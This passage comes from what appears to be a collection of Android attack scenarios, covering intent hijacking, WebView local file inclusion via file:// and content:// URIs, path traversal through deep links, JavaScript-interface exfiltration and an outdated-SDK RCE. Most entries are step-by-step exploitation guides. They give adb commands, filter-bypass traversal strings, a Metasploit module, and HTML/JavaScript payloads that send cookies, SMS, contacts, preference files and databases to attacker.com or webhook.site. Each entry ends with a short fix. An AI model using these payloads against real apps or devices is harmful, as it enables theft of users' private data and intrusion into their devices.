Attack Steps: 1. Install the victim app (target app) that sends implicit intents. You can use a demo app that uses startActivity() or startService() with implicit intent like Intent intent = new Intent("com.example.SEND_MESSAGE"); startActivity(intent);. 2. Use jadx-gui or apktool d app.apk to decompile the app and check where the intent is being created. Look for usages of Intent intent = new Intent("com.example.SEND_MESSAGE"); or intent.setAction("custom.ACTION"). This confirms the app sends an implicit intent with a specific action. 3. Now develop a malicious app or use an existing APK that registers a fake component (Activity/Service) in its AndroidManifest.xml with a matching <intent-filter> for that action. Example: <activity android:name=".FakeReceiverActivity"> <intent-filter> <action android:name="com.example.SEND_MESSAGE"/> <category android:name="android.intent.category.DEFAULT"/> </intent-filter> </activity>. 4. Sign and install this malicious app on the same emulator or device where the victim app is installed. 5. Now launch the victim app and trigger the function that sends the implicit intent. 6. If your malicious app’s Activity or Service is launched instead of the legitimate one, then intent hijacking is successful. You can show a fake screen (e.g., fake login), steal user input, redirect them, or just silently intercept data. 7. In the malicious activity, log received data using: Bundle extras = getIntent().getExtras(); Log.d("Hijack", extras.getString("msg")); — this lets you read any sensitive intent data passed. 8. You can also set intent.setData() or setType() in the malicious filter to match more precisely. Example: <data android:mimeType="text/plain"/>. 9. To increase stealth, make your fake component look identical to the real one, or simply redirect the user back to the real one after logging data. 10. Confirm hijack by checking the Android log: use adb logcat and look for your malicious app’s logs. 11. You can optionally reverse this with adb shell dumpsys activity to check which component handled the intent. If it's your fake one, hijack is proven. 12. Document the action, data, log output, and screen activity. You have now successfully executed Implicit Intent Hijacking (Component Confusion) on a real app setup.
Vulnerability: Implicit Intents sent without specifying trusted component
Impact: Hijack of legitimate system or app workflow, data theft, phishing UI, spoofed response injection
Detection Method: Static analysis of manifest and code + dynamic test with malicious app intent filter
Solution: Always use explicit intents when launching internal components; validate component origin and use package restrictions; don’t expose sensitive data via unprotected implicit intents

Title: Unvalidated file:// URL Loaded from User Input
Scenario Description: Android apps often embed a WebView to load content like help pages, documentation, or URLs based on user input. If the app loads URLs directly from unvalidated user input (like from an intent extra, deep link, or form field) and does not restrict to trusted domains or schemes, an attacker can pass a file:// URI instead of a safe https:// one. This leads the WebView to load local files from the app or system — a Local File Inclusion (LFI). This is known as WebView LFI via file://, and can expose sensitive files like cookies, source code, or cached data.
Tools Used: Android Studio, ADB, jadx-gui, apktool, Android Emulator or rooted phone
Attack Steps: 1. First install a vulnerable Android app that uses a WebView and loads a URL from user input. This could be from an intent extra, deep link, or form input. You can build a sample app or use known vulnerable ones. Example vulnerable code: webView.loadUrl(getIntent().getStringExtra("url"));. 2. Decompile the app using jadx-gui or apktool d app.apk and search for webView.loadUrl(...). Confirm whether it uses data from Intent, Bundle, or EditText without validation. 3. Launch the app via ADB using a malicious intent: adb shell am start -n com.example.vulnerableapp/.WebViewActivity --es url file:///sdcard/Download/secret.html. This injects a file:// path as the URL. 4. If the WebView loads the content of that file (e.g., shows contents of secret.html), the vulnerability is confirmed. You can also try: file:///proc/self/cmdline, file:///data/data/com.example.vulnerableapp/shared_prefs/config.xml, or file:///sdcard/.hiddenfile. 5. Place a test file in the emulator using adb push test.html /sdcard/Download/test.html and load it with: adb shell am start -n com.example.vulnerableapp/.WebViewActivity --es url file:///sdcard/Download/test.html. This proves you can control content loaded inside WebView. 6. If the WebView executes JavaScript (webView.getSettings().setJavaScriptEnabled(true)), try malicious payloads like: <script>alert('XSS via LFI')</script> in your HTML file. This simulates real-world attacks where an attacker might trick a user into opening such content. 7. Also test URL encoded paths: file://%2Fsdcard%2FDownload%2Fsecret.html to bypass naive filters. 8. If the WebView is enabled with local file access (setAllowFileAccess(true)), the attacker may chain with path traversal or even file:// → content:// bridges. 9. To automate this, write a malicious app that sends the same intent with code: Intent i = new Intent(); i.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.WebViewActivity")); i.putExtra("url", "file:///sdcard/Download/malicious.html"); startActivity(i);. 10. Observe the result — if sensitive files are loaded, WebView shows them without errors, or user sees the injected content, the LFI is successful. 11. Document screenshots, logs, and code for reporting. You have now performed a full file:// LFI attack via unvalidated WebView input, a high-severity real-world bug often found in banking, note-taking, and enterprise Android apps.
Vulnerability: WebView loading file:// URLs without validation
Impact: Sensitive file disclosure, malicious HTML execution, stored XSS, app logic abuse
Detection Method: Manifest and Java code review + runtime test with file:// URI injection
Solution: Always sanitize and validate URL input; block file://, content://, and allow only HTTPS using URL schemes + custom WebViewClient validation

Title: JavaScript-Enabled LFI + Local File JS Execution
Attack Type: Local File Inclusion + Script Injection via WebView
Scenario Description: Many Android apps embed a WebView to show help content, user-submitted links, or files. If the app allows user input to control the URL or file path loaded in WebView without validating the source, and has JavaScript enabled, an attacker can load a malicious local file using the file:// scheme. If that file contains JavaScript, it will be executed in the app’s context, which may lead to XSS (cross-site scripting), data theft, cookie access, or visual phishing. This attack is real and widespread in apps that call webView.loadUrl(...) using untrusted data and set webView.getSettings().setJavaScriptEnabled(true).
Tools Used: Android Studio, ADB, jadx-gui, apktool, Android Emulator or rooted device, Notepad
Attack Steps: 1. First, install a test or real app that uses WebView and loads URLs using unvalidated user input. You can create a test app where WebView loads a URL from an Intent extra like: webView.loadUrl(getIntent().getStringExtra("url"));. Make sure webView.getSettings().setJavaScriptEnabled(true); is enabled in the app. 2. Decompile the app using jadx-gui or apktool d app.apk. Check for unprotected usage of webView.loadUrl(...) and ensure the URL comes from external input (like Intent, EditText, etc.). 3. Confirm JavaScript is enabled by locating webView.getSettings().setJavaScriptEnabled(true) in the source code. This step is important because LFI without JS is less dangerous. 4. Create a malicious HTML file on your desktop with this content: <html><body><script>alert('XSS Executed!')</script></body></html> and save it as xss.html. 5. Push this file into the emulator or device’s SD card using: adb push xss.html /sdcard/Download/xss.html. 6. Now simulate an attack by injecting a file:// URL to that HTML using ADB: adb shell am start -n com.example.vulnerableapp/.WebViewActivity --es url file:///sdcard/Download/xss.html. 7. When the app loads, the WebView will fetch and render your local file, and since JS is enabled, the alert popup will appear — confirming JS execution. 8. Try a more advanced payload in your HTML like: <script>fetch('https://attacker.com?cookie='+document.cookie);</script> and observe requests using a server like ngrok or Burp Suite. This simulates real-world data exfiltration. 9. You can also try loading internal files containing JavaScript like file:///data/data/com.example.vulnerableapp/files/savedreport.js (if they exist and contain any eval-safe JS). 10. If the WebView runs this JS without warning or restriction, then the attack is confirmed. 11. You can also chain this LFI with phishing: create a full fake login page in file:///sdcard/Download/fake.html with JS that collects user input and sends it to your server. 12. Send this file to the victim via file sharing apps, or use a malicious app to send the intent programmatically: Intent i = new Intent(); i.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.WebViewActivity")); i.putExtra("url", "file:///sdcard/Download/fake.html"); startActivity(i);. 13. Use adb logcat to watch if internal JS gets executed or if requests are sent out. 14. You have now successfully performed a JavaScript-Enabled LFI attack on an Android WebView, one of the most dangerous flaws in mobile Web apps. This combines two powerful issues: LFI + JS Execution.
Vulnerability: Loading file:// URI from untrusted source + JS enabled
Impact: Full JavaScript execution in app context, phishing UI, stolen cookies, data exfiltration
Detection Method: Code analysis (webView.loadUrl(...)) + runtime test with file:// and JS payload
Solution: Never allow file:// URLs from user input, disable setJavaScriptEnabled(true), and restrict URLs via WebViewClient using URL whitelisting

Title: Accessing content:// URIs via WebView (LFI using Content Providers)
Attack Type: Local File Inclusion via WebView + Content URI Access
Scenario Description: Android uses content:// URIs to access data from Content Providers, which are used to share files, messages, databases, or media between apps. Normally, only specific apps have permission to access a given content:// URI. But if an app's WebView accepts and loads unvalidated URIs from user input, and if JavaScript is enabled, an attacker can load a content:// URI and attempt to steal data or trigger actions in other apps. Some apps expose exported or insecure content providers (android:exported="true") that can be accessed directly using URIs like content://com.example.app.provider/userdata. If the vulnerable app does not block content:// scheme, this becomes a Local File Inclusion attack via WebView that exposes sensitive internal or inter-app data.
Tools Used: Android Studio, ADB, JADX, apktool, Emulator or Rooted Android, Web browser, Notepad
Attack Steps: 1. Install a test app or known vulnerable app that includes a WebView and uses webView.loadUrl() with user-controlled input (via Intent, Deep Link, EditText, etc.). Confirm the app enables JavaScript with webView.getSettings().setJavaScriptEnabled(true) and doesn't restrict URI schemes. 2. Decompile the app with jadx-gui or apktool d app.apk and check if loadUrl() receives input from outside and no filters are applied (e.g., startsWith("http")). 3. Identify a known or test content:// URI to exploit. You can test common targets like: content://com.android.contacts/contacts, content://sms/inbox, or use a vulnerable exported provider from another app like: content://com.vulnerable.app.provider/private_logs. 4. Push a simple HTML file with JavaScript on the emulator: adb push view.html /sdcard/Download/view.html with contents: <html><body><iframe src="content://sms/inbox"></iframe></body></html>. 5. Now send an intent to the vulnerable app: adb shell am start -n com.example.vulnerableapp/.MainActivity --es url file:///sdcard/Download/view.html. The WebView will load the file containing the iframe, which requests the content:// URI. 6. If the app has not blocked WebView from accessing content URIs, and if the URI is accessible, you will see the raw output of the content provider loaded in the WebView. 7. You can also directly inject the content URI into the app’s WebView using: adb shell am start -n com.example.vulnerableapp/.MainActivity --es url content://com.android.contacts/contacts. 8. If WebView shows contact names, numbers, or SMS messages, the attack is confirmed. 9. Use adb logcat to monitor app logs and look for any stack traces or file loading attempts — if the app crashes or reveals full content, it's exploitable. 10. Now test advanced content provider URIs (known public ones or from exported providers): for example, install an intentionally vulnerable app with an exported provider and try content://com.vuln.provider/files/private.json. 11. To test this via malicious app: build an APK that sends the same intent with putExtra("url", "content://...") to the vulnerable WebView activity. 12. For further exploitation, chain this attack with JavaScript. Push a file with <script>fetch("content://sms/inbox").then(res => res.text()).then(txt => location.href='https://attacker.com/?data='+btoa(txt))</script> and trigger it using file:// scheme. 13. This would send SMS or contact content directly to your server. Confirm receipt using ngrok, Burp Suite, or webhook.site. 14. If successful, you’ve performed a real, working WebView LFI via content:// access, combining Content Provider abuse + unvalidated WebView URI loading. This is a serious vulnerability in many apps that use WebView without proper input sanitation.
Vulnerability: Unvalidated content:// URI loading in WebView + exposed Content Providers
MITRE Technique: T1437 – Execution via API / T1409 – Access Sensitive Data via Local IPC
Impact: Read sensitive data (SMS, contacts, local DBs), app crash, user tracking, data exfiltration
Detection Method: Code inspection (webView.loadUrl(...)) + runtime test with content:// injections
Solution: Always block content:// and file:// in WebView inputs, validate URLs using a whitelist, use WebViewClient.shouldOverrideUrlLoading() and restrict URI schemes

Title: Reading App-Private Files via Path Traversal in WebView
Scenario Description: Some Android apps allow users to specify file paths or file names (e.g., for opening help docs, loading reports, exporting files, etc.) via WebView or file-based features. If the app does not sanitize the input path and passes it directly to WebView or a file loader, an attacker can perform a path traversal using sequences like ../ to move out of the allowed folder and access private files in the app’s internal storage. If the app also allows file:// URLs to be loaded in WebView, and JavaScript is enabled, this attack can even lead to JS-based data theft. This vulnerability is often overlooked because apps assume users won't manipulate file paths, but in reality, WebView combined with file:// + ../ can read shared_prefs, SQLite DBs, cached files, etc.
Tools Used: Android Studio, ADB, jadx-gui, apktool, Emulator or Rooted Phone, Notepad
Attack Steps: 1. First, install the target app (vulnerable app) that uses WebView and allows user-controlled input to form or load file paths. Example code in the app could be: webView.loadUrl("file:///sdcard/docs/" + getIntent().getStringExtra("file"));. This directly appends user input to a file path. 2. Decompile the APK using jadx-gui or apktool d app.apk and search for loadUrl calls inside Activities or Fragments. Look for string concatenation like "file://" + userInput or similar. 3. Confirm whether JavaScript is enabled in the WebView with webView.getSettings().setJavaScriptEnabled(true). 4. Now create a malicious intent to exploit path traversal using ../ — for example: adb shell am start -n com.vuln.app/.WebViewActivity --es file ../../../../data/data/com.vuln.app/shared_prefs/config.xml. This attempts to escape /sdcard/docs/ and access internal app-private files via WebView. 5. If the WebView loads the XML file (typically containing user settings, API keys, etc.), it will render as plain text in the app’s WebView — confirming successful LFI via path traversal. 6. For testing, you can also try reading other sensitive files like: ../../../../data/data/com.vuln.app/databases/user.db or ../../../../proc/self/cmdline. 7. Push a local HTML file with JavaScript to observe advanced results: Create a file named stealer.html with <script>fetch("file:///data/data/com.vuln.app/shared_prefs/config.xml").then(r=>r.text()).then(t=>location='https://attacker.com/?d='+btoa(t));</script> and push it using adb push stealer.html /sdcard/Download/stealer.html. 8. Then run: adb shell am start -n com.vuln.app/.WebViewActivity --es file ../../../../sdcard/Download/stealer.html. This will trigger the JS to fetch the internal file and send it to your attacker-controlled server. 9. Monitor your server (using ngrok or webhook.site) to confirm if the file content is exfiltrated. 10. This confirms successful path traversal LFI using file:// + WebView. 11. Advanced: If the app blocks ../, try double encoding: %2e%2e/ or %252e%252e/ in the file path. For example: --es file %2e%2e%2f%2e%2e%2fdata%2fdata%2fcom.vuln.app%2fshared_prefs%2fconfig.xml. This can bypass basic filters. 12. Document all successful reads, screenshots, and WebView behaviors. You have now successfully carried out a Local File Inclusion via Path Traversal attack inside WebView — a real-world, high-impact mobile security issue.
Vulnerability: WebView loading file:// URLs with unsanitized user-controlled file paths
Impact: Steal internal app files, settings, tokens, logs, databases, bypass sandboxing
Detection Method: Code review + runtime test using file:// path with ../ traversal injection
Solution: Always sanitize file paths, reject ../, enforce path restrictions, never use user input in WebView loadUrl without strict validation, and block file:// URIs entirely

Source: CWE-22, CWE-98, OWASP MASVS, MITRE ATT&CK Mobile T1410

Title: Intent-Based File Inclusion via Deep Link
Attack Type: Local File Inclusion (LFI) via Deep Link + WebView
Scenario Description: Many Android apps register deep links (special links like appname://open) to allow launching specific features directly via a browser or intent. These deep links often contain parameters (e.g., appname://open?file=report.html). If the app’s WebView or file loader takes these parameters and directly loads them without sanitizing, it’s possible to inject a file:// path or use ../ traversal to read sensitive internal or external files. This becomes an LFI (Local File Inclusion) triggered through an intent or a deep link, allowing attackers to include and read arbitrary files inside the WebView — even without touching the app's UI. This attack is extremely common in apps that support file preview, report download, or offline content rendering through URLs or filenames from deep links.
Tools Used: Android Studio, ADB, Emulator or Rooted Device, JADX, Chrome browser (or URI launcher), Notepad
Attack Steps: 1. Find or install an app that supports deep linking and has a WebView component. The app must declare <intent-filter> with android:scheme="appname" in its manifest. Use jadx-gui or apktool d app.apk to analyze the app and locate deep link handlers. Look for Activities that receive file or URL parameters via Intent or URI, such as: Uri uri = getIntent().getData(); String file = uri.getQueryParameter("file"); webView.loadUrl("file:///sdcard/docs/" + file);. This pattern is vulnerable. 2. Confirm WebView JavaScript is enabled using: webView.getSettings().setJavaScriptEnabled(true). This increases risk. 3. Test the deep link on the emulator. In Chrome or any browser on emulator/device, open a link like: appname://open?file=../../../../data/data/com.vuln.app/shared_prefs/config.xml. 4. If the app opens and the WebView loads the internal file, it confirms the vulnerability. This shows path traversal via deep link. 5. Alternatively, run it from ADB: adb shell am start -a android.intent.action.VIEW -d "appname://open?file=../../../../data/data/com.vuln.app/shared_prefs/config.xml" com.vuln.app. This triggers the deep link directly using intent. 6. The file (like config.xml) will render in the app’s WebView if vulnerable. Try other targets like: ../../../../sdcard/Download/x.html, ../../../proc/self/cmdline, or any existing internal file. 7. Now push a local HTML file with a script using: adb push steal.html /sdcard/Download/steal.html with content like <script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>location='https://attacker.com?x='+btoa(t));</script>. Then open: appname://open?file=../../../../sdcard/Download/steal.html. 8. The WebView will load your attacker-controlled file and execute the JavaScript, which exfiltrates sensitive app data. Capture it using webhook.site, ngrok, or Burp Collaborator. 9. Some apps block ../. Bypass using encoded traversal: %2e%2e%2f%2e%2e%2f, or ..%252f..%252f. Example: appname://open?file=..%252f..%252f..%252fdata%252fdata%252fcom.vuln.app%252fshared_prefs%252fuser.xml. 10. You have now exploited a real-world Intent-Based LFI via Deep Link in WebView, causing internal file disclosure without any user interaction — purely via a crafted URI. 11. Advanced: Write a small malicious app that sends the crafted Intent using: Intent i = new Intent(Intent.ACTION_VIEW); i.setData(Uri.parse("appname://open?file=../../../../data/data/...")); startActivity(i); — simulating full exploitation vector.
Vulnerability: WebView + Deep Link Intent loading unsanitized file paths
Impact: Read app-private files, configuration leakage, stored credentials, or token theft
Detection Method: Manifest + Java code review + browser/intent test with deep link parameter injection
Solution: Sanitize all deep link parameters; reject traversal (../); allow only whitelisted filenames or URLs; avoid loading file:// paths from external input; use URL schemes validation (http/https only)

Title: Using JavaScript Interface to Exfiltrate Local Files
Scenario Description: Android WebView allows apps to expose Java objects into JavaScript using addJavascriptInterface(). If the app uses this interface to expose sensitive functions (like file access, logging, or intents) to any webpage loaded inside the WebView — and if the app also loads untrusted or attacker-controlled HTML via file:// or deep links — the attacker can use JavaScript to call those functions. When combined with LFI (such as loading local files via file://), the attacker can inject a malicious HTML that uses the JavaScript interface to exfiltrate internal app files, such as shared preferences, user info, or DB contents. This is highly dangerous, especially when apps do not restrict WebView content sources or JS interface binding.
Tools Used: Android Studio, ADB, jadx-gui, apktool, Notepad, Emulator or rooted device, webhook.site or ngrok
Attack Steps: 1. Install a vulnerable test app or target app that uses WebView and contains a line like webView.addJavascriptInterface(new MyJSBridge(), "Android") in any Activity. This exposes native methods to JavaScript inside WebView. Use JADX or apktool to decompile the APK and search for addJavascriptInterface(). Confirm that JavaScript is enabled in WebView using webView.getSettings().setJavaScriptEnabled(true). 2. Inspect the interface class (e.g., MyJSBridge) and identify any method annotated with @JavascriptInterface, such as public void sendFile(String content) or public void uploadData(String payload). These are callable via JavaScript. 3. Check if the app loads local files from user input using webView.loadUrl(...) with file:// or content://. If yes, and you can control that path through an intent or deep link, then it is exploitable. 4. On your PC, create a malicious HTML payload named exploit.html with the following content: <html><body><script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>Android.sendFile(t));</script></body></html>. This script reads an internal file and sends it to the exposed Android method. 5. Push the HTML to your emulator using: adb push exploit.html /sdcard/Download/exploit.html. 6. Launch the vulnerable activity using: adb shell am start -n com.vuln.app/.MainActivity --es url file:///sdcard/Download/exploit.html. This causes the app to load the malicious HTML. 7. When WebView renders the file, the JavaScript will fetch internal data from file:// and send it to the Java interface, e.g., Android.sendFile(...). 8. If the interface logs it, stores it, or forwards it to an external server, the attack is successful. For better proof, edit your malicious HTML to send the data over network: <script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>{let i=new Image(); i.src='https://webhook.site/your-id?data='+btoa(t);});</script>. 9. Replace webhook.site/your-id with your real webhook URL. Push again using adb push exploit2.html /sdcard/Download/exploit2.html. Then launch it the same way. 10. Open your webhook dashboard and verify — if you see the config data, the attack worked. 11. You can also try chaining the JS interface to launch activities, send SMS, or write files if methods like sendSMS(String), openURL(String) exist in the bound class. 12. Congratulations — you have now successfully exploited a real-world LFI using JavaScriptInterface to exfiltrate internal files via file:// and WebView. This technique is deadly when apps expose unsafe methods and load untrusted HTML.
Vulnerability: WebView loading file:// content + Exposed addJavascriptInterface()
MITRE Technique: T1437 – Code Execution via JS Interface
Impact: Internal file read, exfiltration, possible RCE or malicious actions from JS
Detection Method: Code audit for addJavascriptInterface() and WebView behavior + runtime HTML injection
Solution: Never expose JS interface methods to untrusted web content; use @TargetApi(17) and checkOrigin() manually or avoid addJavascriptInterface() entirely; block file:// URLs

Title: LFI via Download Manager or WebView File Chooser
Attack Type: Local File Inclusion (LFI) via File Picker + WebView
Scenario Description: Some Android apps allow users to download files from a URL using the system DownloadManager, or allow them to select files using WebView's file input (<input type="file">). If the app loads or previews the selected file via WebView or directly executes loadUrl() or loadData() with file:// path, and does not restrict or sanitize the selected file path, a user can abuse the file picker or downloaded path to load sensitive local files like app-private shared_prefs, SQLite DBs, or even files from /proc/. This becomes an LFI attack that bypasses user interaction and can even leak internal app files if JavaScript is enabled.
Tools Used: Android Studio, ADB, jadx-gui, Emulator/Rooted Device, Notepad, Burp Suite, webhook.site
Attack Steps: 1. Install or create a test app that includes a file picker (via <input type="file">) or a file download feature using Android's DownloadManager. You can find this by searching in the APK for DownloadManager.Request(...) or <input type="file"> elements inside WebView content. 2. Use jadx-gui or apktool d app.apk to decompile and check how file selection is handled. Many apps allow selected file paths to be passed to WebView using loadUrl("file://" + path) or webView.loadData(...). 3. Also check if WebView has JavaScript enabled (webView.getSettings().setJavaScriptEnabled(true)), which allows file exfiltration. 4. Open the app and navigate to the file picker or file download UI. For file picker, upload a malicious HTML file via file chooser that contains: <script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>location='https://webhook.site/your-id?d='+btoa(t));</script>. Save this file as stealer.html. 5. Push it using ADB: adb push stealer.html /sdcard/Download/stealer.html. Then, select this file via the app’s file picker (if available). 6. If the app reads and renders the file in WebView directly (without sanitization), the JavaScript inside it will execute, read the internal file, and send it to your webhook. 7. Monitor webhook.site or ngrok to confirm if the data is sent — this confirms LFI via file picker. 8. Now test the DownloadManager route. Apps that download a file via URL and load it in WebView are even more vulnerable. Inside the app, find a place where you can enter a URL to download or click a button to fetch a file. Provide this payload URL: https://attacker.com/stealer.html (use same JS as above). 9. Host your malicious stealer.html on a web server or use ngrok or python3 -m http.server on your PC. When the app downloads it using DownloadManager, it gets stored at /storage/emulated/0/Download/stealer.html. 10. If the app loads this file in WebView using something like webView.loadUrl("file://" + downloadedFilePath), the malicious JavaScript will be executed from inside the app context. It can then read internal file paths like file:///data/data/com.vuln.app/databases/user.db. 11. As an attacker, try chaining this by modifying your hosted file: <script>fetch('file:///data/data/com.vuln.app/databases/user.db').then(r=>r.blob()).then(b=>{ let reader = new FileReader(); reader.onload=function(){location='https://webhook.site/your-id?data='+btoa(reader.result)}; reader.readAsText(b); });</script> 12. Repeat the process and wait for data to show up in your webhook. If it does, the LFI via download manager path is confirmed. 13. This attack works because the app implicitly trusts file inputs and downloaded file paths, and directly loads them using file:// scheme. Combined with enabled JS, this creates a powerful LFI + JS execution vector.
Vulnerability: Unsanitized file loading from file picker or download manager into WebView
MITRE Technique: T1437 – Execute via Trusted Path / T1410 – File Inclusion via User-Controlled Input
Impact: Full internal file access, config leaks, credential theft, sandbox escape
Detection Method: Inspect APK + test file uploads and download paths + load file:// in WebView
Solution: Never load file:// paths from user input; disable file access in WebView (setAllowFileAccess(false)), block JavaScript, or validate MIME/file type strictly

Title: Remote Code Execution via Known SDK Vulnerability
Scenario Description: Many Android applications use third-party SDKs (for ads, analytics, social login, etc.) that come as .aar or .jar files. If an app includes an outdated version of an SDK with known vulnerabilities, attackers can exploit those flaws to achieve Remote Code Execution (RCE), especially when the SDK exposes JavaScript bridges, insecure web content loading, or insecure file parsing. A well-known real-world example is the Cordova Android Plugin Vulnerability (CVE-2017-3160), which allowed JavaScript code running in WebView to execute arbitrary Java code via an insecure addJavascriptInterface() in an outdated Cordova WebView plugin.
Tools Used: Android Studio, APKTool, JADX, Burp Suite, Metasploit (optional), Browser, ADB, Emulator or Device, CVE Database (e.g., cvedetails.com)
Attack Steps: 1. Identify a target mobile application suspected to use an outdated SDK. For this demo, we’ll use an app that uses an outdated Cordova WebView plugin vulnerable to CVE-2017-3160. 2. Decompile the APK using apktool d target.apk or open it in jadx-gui. Search for addJavascriptInterface() and check if it exposes any class like CordovaBridge, GapBridge, or similar. Look for: webView.addJavascriptInterface(new CordovaBridge(), "cordova"). 3. Check the WebView settings in the same class. Ensure JavaScript is enabled using: webView.getSettings().setJavaScriptEnabled(true) — this is necessary for the exploit. 4. Now check if the app loads content from untrusted sources — such as external URLs or files on SD card — using webView.loadUrl(...) or loadDataWithBaseURL(...). If this is present and not validated, it’s exploitable. 5. On your computer, create a malicious HTML payload (e.g., exploit.html) with the following JavaScript: <script>cordova.exec("alert('RCE')", "", "", "", "");</script>. In outdated Cordova SDKs, this triggers the native method exposed insecurely via the JS interface. 6. Push this file to the emulator: adb push exploit.html /sdcard/Download/exploit.html. 7. Open this file using a browser intent, deep link, or any file loader in the app. If the app loads it in WebView (via file://), the JavaScript will be executed and trigger the exposed Java method. 8. In older SDK versions, it’s possible to chain this further to execute file read, code injection, or even command execution (via native modules or reflective invocation). 9. For advanced exploitation, use Metasploit’s android/webview_addjavascriptinterface module. Start Metasploit, run: use exploit/multi/browser/webview_addjavascriptinterface, set your payload, and host it. Send the URL to the app via any input or log injection method. 10. If the app loads it in WebView, you will get a remote session (if supported by the vulnerable SDK). 11. Alternatively, intercept a request in Burp and inject a payload via parameters that the SDK loads into WebView. 12. Watch for the exploit to trigger. If the SDK is vulnerable, you will see the payload execute — possibly showing alert boxes, reading internal files, or connecting to your server. 13. Confirm the SDK version by checking the build.gradle, .aar filename, or AndroidManifest.xml meta-data tags. Search online (e.g., cordova CVE) and verify if that version is known to be vulnerable. 14. Congratulations — you’ve confirmed a real-world RCE through an outdated SDK embedded in the target app.
Vulnerability: Insecure outdated SDK with vulnerable JavaScript interface or input handling
MITRE Technique: T1437 – Code Execution via Third-Party Component
Impact: Full device compromise, app data theft, code execution, session hijacking
Detection Method: Static code analysis for SDK usage + dynamic test with JS payload in WebView
Solution: Update all SDKs regularly; check CVE database; avoid using WebView in SDKs; apply sandboxing; avoid addJavascriptInterface() unless absolutely needed
